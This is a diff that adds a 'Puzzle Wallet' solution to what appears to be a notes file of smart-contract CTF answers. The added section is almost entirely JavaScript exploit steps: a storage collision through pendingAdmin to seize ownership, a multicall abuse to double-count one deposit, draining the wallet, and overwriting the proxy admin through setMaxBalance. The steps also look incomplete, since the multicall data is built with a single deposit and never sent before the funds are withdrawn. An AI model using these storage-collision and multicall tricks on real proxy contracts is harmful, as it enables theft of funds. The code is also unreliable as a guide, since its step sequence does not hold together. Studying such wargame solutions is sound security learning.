@@ -454,6 +454,24 @@ contract Dex2Attacker is ERC20 {
 ```
 
 
+## Puzzle Wallet
+
+```js
+// get owner of PuzzleWallet (by storage collision with pendingAdmin)
+//// Here '000000000000000000000000address', address needs to be replace by your address without 0x
+contract.sendTransaction({value: 0, data: '0xa6376746000000000000000000000000address'})
+// get whitelisted
+contract.addToWhitelist("0xaddress")
+// build exploit (needs to call deposit two times, so we will have deposited 0.002 eth)
+depositData = await contract.methods["deposit()"].request().then(v => v.data)
+// call multicall, so it call deposit twice with the same amount
+multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
+// get the amount out (0.002 eth)
+contract.execute("0xaddress", 2000000000000000, 0x00)
+// set MaxBalance to our address (will collide with the proxy admin address)
+contract.setMaxBalance('0xaddress')
+```
+
 ## Others
 
 Read a smart contract storage :
